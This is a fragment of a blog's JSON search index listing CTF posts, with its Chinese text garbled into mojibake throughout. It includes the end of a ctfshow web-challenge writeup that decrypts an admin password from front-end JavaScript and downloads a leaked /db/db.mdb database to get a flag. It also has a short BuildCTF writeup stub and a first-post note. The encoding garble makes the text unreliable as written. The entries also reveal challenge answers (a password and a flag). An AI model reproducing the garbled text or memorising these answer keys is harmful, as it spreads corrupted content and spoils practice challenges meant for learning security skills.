å¯†ï¼Œä½¿ç”¨è¿™ä¸ªç½‘ç«™ï¼Œä»ä¸Šé¢å‰ç«¯çš„JSä¸­æ‰¾åˆ°ç›¸å…³æ–¹æ³•ï¼šCBC ZeroPaddingï¼Œå†æ ¹æ®å¯†æ–‡è§£å¯†å‡ºå¯†ç ï¼ši_want_a_36d_girl\nç›´æ¥æäº¤è´¦å·å’Œå¯†ç admin i_want_a_36d_girlè·å–flag\nWEB20 mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚\næ ¹æ®æç¤ºæœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥æœåˆ°/db/db.mdbï¼Œå°è¯•ä¸‹è½½åä½¿ç”¨accessæ‰“å¼€ï¼Œè™½ç„¶æŠ¥äº†ä¸€å †é”™ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯æ‰¾åˆ°äº†flag\nflag{ctfshow_old_database}\n","date":"2024-11-06T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_informationcollect_write_up/","title":"CTF_show Webå…¥é—¨ ä¿¡æ¯æ”¶é›†writeup WEB1-WEB20"},{"content":"æ–°äººç¬¬ä¸€æ¬¡æ¯”èµ›çš„writeupï¼Œå¯èƒ½å†™çš„æœ‰å¾ˆå•°å—¦çš„åœ°æ–¹ï¼Œè¯·é«˜æ‰‹ä»¬è§è°…å‘€QAQ\nå› ä¸ºç›´æ¥ä¸Šä¼ å¤ªå¤§äº†ï¼Œè®¿é—®æ•ˆæœä¸ä½³ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æä¾›åŸå§‹æ–‡æ¡£\nBuildCTFå®˜æ–¹å›¾ç‰‡ ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/build_ctf_write_up/","title":"ä»BuildCTFå¼€å§‹â€”â€”CTFçš„æ—…ç¨‹"},{"content":" éšç€å‰ä¸¤ä¸ªåšå®¢åˆ†åˆ«å› ä¸º æ²¡ç»­è´¹å’Œrm -rf ç›¸ç»§æš´æ¯™ä»¥åï¼Œç¬¬ä¸‰ä¸ªåˆåŒå’å•æ¥å•¦ï¼ï¼\nå—¯ æœ‰ç‚¹ä¸å‰åˆ©\n","date":"2024-10-31T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/new_start_first_blog/","title":"ç¬¬ä¸€ç¯‡åšå®¢"}]